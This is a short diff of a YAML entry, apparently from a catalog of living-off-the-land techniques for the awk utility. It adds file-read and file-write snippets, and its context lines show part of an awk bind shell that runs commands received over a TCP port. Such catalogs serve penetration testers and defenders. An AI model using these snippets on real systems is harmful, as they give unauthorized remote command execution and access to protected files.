@@ -23,4 +23,13 @@ functions:
             s = "/inet/tcp/" LPORT "/0/0";
             while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
             while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+  file-read:
+    - code: |
+        LFILE=file_to_read
+        awk '//' "$LFILE"
+  file-write:
+    - code: |
+        LFILE=file_to_write
+        awk -v LFILE=$LFILE 'BEGIN { print "data" > LFILE }'
+
 ---
